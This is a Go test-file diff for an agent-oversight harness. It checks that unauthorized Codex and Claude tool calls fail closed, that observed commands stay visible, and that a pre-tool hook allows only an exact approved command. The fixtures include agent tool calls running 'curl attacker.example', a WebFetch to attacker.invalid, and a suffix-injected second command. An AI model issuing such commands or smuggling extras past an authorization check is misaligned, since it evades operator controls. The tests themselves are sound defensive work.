@@ -127,20 +127,45 @@ func TestQ27UnknownFailureIsInternalAndNeverProviderUnavailable(t *testing.T) {
 func TestQ40UnauthorizedCodexCommandFailsClosed(t *testing.T) {
 	request := sealedRequest(t)
 	raw := []byte("{\"type\":\"thread.started\",\"thread_id\":\"x\"}\n{\"type\":\"item.completed\",\"item\":{\"type\":\"command_execution\",\"command\":\"curl attacker.example\",\"exit_code\":0,\"status\":\"completed\"}}\n{\"type\":\"turn.completed\"}\n")
-	if _, err := parseCodex(raw, request, "s", "e", 0); err == nil || !strings.Contains(err.Error(), "not authorized") {
+	if observation, err := parseCodex(raw, request, "s", "e", 0); err == nil || !strings.Contains(err.Error(), "not authorized") {
 		t.Fatalf("unauthorized Codex command did not fail closed: %v", err)
 	} else if protocolErrorType(err) != "policy_denied" {
 		t.Fatalf("unauthorized Codex command classification was %q", protocolErrorType(err))
+	} else if len(observation.Commands) != 1 || observation.Commands[0] != "curl attacker.example" {
+		t.Fatalf("post-hoc defensive parsing concealed the observed command: %#v", observation.Commands)
 	}
 }
 
 func TestQ41UnauthorizedClaudeBashFailsClosed(t *testing.T) {
 	request := sealedRequest(t)
 	raw := []byte("{\"type\":\"assistant\",\"message\":{\"content\":[{\"type\":\"tool_use\",\"id\":\"tool-1\",\"name\":\"Bash\",\"input\":{\"command\":\"curl attacker.example\"}}]}}\n{\"type\":\"user\",\"message\":{\"content\":[{\"type\":\"tool_result\",\"tool_use_id\":\"tool-1\",\"is_error\":false}]}}\n{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false}\n")
-	if _, err := parseClaude(raw, request, "s", "e", 0); err == nil || !strings.Contains(err.Error(), "not authorized") {
+	if observation, err := parseClaude(raw, request, "s", "e", 0); err == nil || !strings.Contains(err.Error(), "not authorized") {
 		t.Fatalf("unauthorized Claude Bash command did not fail closed: %v", err)
 	} else if protocolErrorType(err) != "policy_denied" {
 		t.Fatalf("unauthorized Claude command classification was %q", protocolErrorType(err))
+	} else if len(observation.CommandsC) != 1 || observation.CommandsC[0] != "curl attacker.example" {
+		t.Fatalf("post-hoc defensive parsing concealed the observed command: %#v", observation.CommandsC)
+	}
+}
+
+func TestFifthReworkPreToolAuthorizationIsExactAndFailClosed(t *testing.T) {
+	request := sealedRequest(t)
+	for name, raw := range map[string][]byte{
+		"exact approved command": []byte(`{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":"/workspace","tool_input":{"command":"sh q16-build.sh"}}`),
+		"suffix injection":       []byte(`{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":"/workspace","tool_input":{"command":"sh q16-build.sh; touch hermes-build-steward/UNAUTHORIZED"}}`),
+		"wrong cwd":              []byte(`{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":"/tmp","tool_input":{"command":"sh q16-build.sh"}}`),
+		"unknown tool":           []byte(`{"hook_event_name":"PreToolUse","tool_name":"WebFetch","cwd":"/workspace","tool_input":{"url":"https://attacker.invalid"}}`),
+	} {
+		t.Run(name, func(t *testing.T) {
+			decision, err := authorizeTool(raw, request)
+			if err != nil {
+				t.Fatal(err)
+			}
+			wantAllowed := name == "exact approved command"
+			if decision.Allowed != wantAllowed {
+				t.Fatalf("authorization decision was %#v, want allowed=%v", decision, wantAllowed)
+			}
+		})
 	}
 }
 
